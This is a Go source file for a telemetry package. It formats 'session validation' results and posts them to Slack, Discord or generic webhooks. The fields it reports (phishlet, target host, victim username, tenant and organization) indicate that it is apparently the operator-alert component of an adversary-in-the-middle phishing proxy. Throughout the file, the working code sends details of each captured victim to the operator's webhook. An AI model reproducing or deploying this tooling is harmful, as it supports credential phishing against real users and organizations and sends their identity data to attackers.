// Package telemetry formats and dispatches sanitized session validation alerts.
package telemetry

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/s4l1hs/olta/pkg/proxy/validation"
)

// Provider identifies the webhook payload dialect.
type Provider string

const (
	ProviderGeneric Provider = "generic"
	ProviderSlack   Provider = "slack"
	ProviderDiscord Provider = "discord"
)

// Dispatcher posts validation results to a configured webhook.
type Dispatcher struct {
	endpoint *url.URL
	provider Provider
	client   *http.Client
}

// NewDispatcher validates a webhook URL and auto-detects Slack and Discord.
// Other HTTP(S) endpoints receive the generic JSON schema.
func NewDispatcher(rawURL string, client *http.Client) (*Dispatcher, error) {
	endpoint, err := url.Parse(rawURL)
	if err != nil || !endpoint.IsAbs() || (endpoint.Scheme != "http" && endpoint.Scheme != "https") || endpoint.Hostname() == "" {
		return nil, fmt.Errorf("webhook URL must be an absolute HTTP(S) URL")
	}
	if client == nil {
		client = &http.Client{Timeout: 10 * time.Second}
	}
	return &Dispatcher{
		endpoint: endpoint,
		provider: DetectProvider(endpoint),
		client:   client,
	}, nil
}

// DetectProvider determines the payload format from the webhook hostname.
func DetectProvider(endpoint *url.URL) Provider {
	if endpoint == nil {
		return ProviderGeneric
	}
	host := strings.ToLower(endpoint.Hostname())
	path := strings.ToLower(endpoint.Path)
	switch {
	case (host == "hooks.slack.com" || strings.HasSuffix(host, ".hooks.slack.com")) && strings.HasPrefix(path, "/services/"):
		return ProviderSlack
	case (host == "discord.com" || host == "discordapp.com" || strings.HasSuffix(host, ".discord.com")) && strings.Contains(path, "/api/webhooks/"):
		return ProviderDiscord
	default:
		return ProviderGeneric
	}
}

// Provider returns the detected webhook payload dialect.
func (dispatcher *Dispatcher) Provider() Provider {
	if dispatcher == nil {
		return ProviderGeneric
	}
	return dispatcher.provider
}

// Dispatch formats and sends one sanitized validation result.
func (dispatcher *Dispatcher) Dispatch(ctx context.Context, result validation.Result) error {
	if dispatcher == nil || dispatcher.endpoint == nil {
		return fmt.Errorf("telemetry dispatcher is not configured")
	}
	payload, err := FormatPayload(dispatcher.provider, result)
	if err != nil {
		return err
	}
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, dispatcher.endpoint.String(), bytes.NewReader(payload))
	if err != nil {
		return fmt.Errorf("build webhook request: %w", err)
	}
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", "Olta-Telemetry/1.0")
	response, err := dispatcher.client.Do(request)
	if err != nil {
		return fmt.Errorf("dispatch webhook: %w", err)
	}
	defer response.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 64<<10))
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return fmt.Errorf("webhook returned HTTP %d", response.StatusCode)
	}
	return nil
}

// FormatPayload produces the provider-specific JSON payload. Result contains
// no cookie or token fields by design.
func FormatPayload(provider Provider, result validation.Result) ([]byte, error) {
	switch provider {
	case ProviderSlack:
		return json.Marshal(slackPayload(result))
	case ProviderDiscord:
		return json.Marshal(discordPayload(result))
	case ProviderGeneric:
		return json.Marshal(struct {
			Event  string            `json:"event"`
			Result validation.Result `json:"result"`
		}{Event: "session_validation", Result: result})
	default:
		return nil, fmt.Errorf("unsupported telemetry provider %q", provider)
	}
}

func slackPayload(result validation.Result) interface{} {
	fields := []map[string]interface{}{
		{"type": "mrkdwn", "text": "*Status*\n" + escapeSlack(string(result.Status))},
		{"type": "mrkdwn", "text": "*User*\n" + escapeSlack(displayValue(result.Identity.Username))},
		{"type": "mrkdwn", "text": "*Target*\n" + escapeSlack(displayValue(result.TargetHost))},
		{"type": "mrkdwn", "text": "*Phishlet*\n" + escapeSlack(displayValue(result.Phishlet))},
	}
	if result.Identity.TenantID != "" {
		fields = append(fields, map[string]interface{}{"type": "mrkdwn", "text": "*Tenant*\n" + escapeSlack(result.Identity.TenantID)})
	}
	if result.Identity.Organization != "" {
		fields = append(fields, map[string]interface{}{"type": "mrkdwn", "text": "*Organization*\n" + escapeSlack(result.Identity.Organization)})
	}
	return map[string]interface{}{
		"text": "Olta session validation: " + string(result.Status),
		"blocks": []interface{}{
			map[string]interface{}{"type": "header", "text": map[string]string{"type": "plain_text", "text": "Olta Session Validation"}},
			map[string]interface{}{"type": "section", "fields": fields},
			map[string]interface{}{"type": "context", "elements": []map[string]string{{"type": "mrkdwn", "text": "Reference `" + result.SessionReference + "` • " + result.Timestamp.UTC().Format(time.RFC3339)}}},
		},
	}
}

func discordPayload(result validation.Result) interface{} {
	fields := []map[string]interface{}{
		{"name": "Status", "value": displayValue(string(result.Status)), "inline": true},
		{"name": "User", "value": displayValue(result.Identity.Username), "inline": true},
		{"name": "Target", "value": displayValue(result.TargetHost), "inline": true},
		{"name": "Phishlet", "value": displayValue(result.Phishlet), "inline": true},
	}
	if result.HTTPStatus != 0 {
		fields = append(fields, map[string]interface{}{"name": "HTTP", "value": strconv.Itoa(result.HTTPStatus), "inline": true})
	}
	if result.Identity.TenantID != "" {
		fields = append(fields, map[string]interface{}{"name": "Tenant", "value": result.Identity.TenantID, "inline": true})
	}
	if result.Identity.Organization != "" {
		fields = append(fields, map[string]interface{}{"name": "Organization", "value": result.Identity.Organization, "inline": true})
	}
	return map[string]interface{}{
		"username": "Olta Telemetry",
		"embeds": []interface{}{map[string]interface{}{
			"title":       "Session Validation",
			"description": result.Detail,
			"color":       statusColor(result.Status),
			"timestamp":   result.Timestamp.UTC().Format(time.RFC3339),
			"fields":      fields,
			"footer":      map[string]string{"text": "Reference " + result.SessionReference},
		}},
	}
}

func statusColor(status validation.Status) int {
	switch status {
	case validation.StatusValid:
		return 0x2ECC71
	case validation.StatusInvalid:
		return 0xE74C3C
	case validation.StatusError:
		return 0xF39C12
	default:
		return 0x95A5A6
	}
}

func displayValue(value string) string {
	if strings.TrimSpace(value) == "" {
		return "unknown"
	}
	return value
}

func escapeSlack(value string) string {
	value = strings.ReplaceAll(value, "&", "&amp;")
	value = strings.ReplaceAll(value, "<", "&lt;")
	return strings.ReplaceAll(value, ">", "&gt;")
}
